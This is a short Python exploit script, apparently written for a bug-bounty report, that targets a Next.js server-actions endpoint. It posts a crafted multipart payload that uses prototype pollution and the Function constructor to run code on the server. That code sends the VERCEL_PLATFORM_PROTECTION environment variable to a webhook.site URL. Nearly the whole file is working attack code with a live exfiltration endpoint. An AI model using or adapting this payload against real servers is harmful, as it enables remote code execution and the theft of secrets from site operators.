#!/usr/bin/env python3
"""
Ultra simple - exactly as the vulnerability was discovered
"""

import requests

TARGET = "https://nextjs-cve-hackerone.vercel.app"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

# Method 1: Simplest possible - send as raw multipart
boundary = "X"
body = f"""--{boundary}\r
Content-Disposition: form-data; name="0"\r
\r
{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":"require('https').get('{WEBHOOK}?simple='+process.env.VERCEL_PLATFORM_PROTECTION)","_formData":{{"get":"$1:constructor:constructor"}}}}}}\r
--{boundary}\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
--{boundary}--\r
"""

headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}',
    'Next-Action': 'ignored',
}

print("[*] Sending ultra-simple payload...")
r = requests.post(TARGET, data=body, headers=headers, timeout=10)
print(f"Status: {r.status_code}")
print(f"Response: {r.text[:200]}")

if r.status_code == 500:
    print(f"\n[*] Check webhook: {WEBHOOK}")
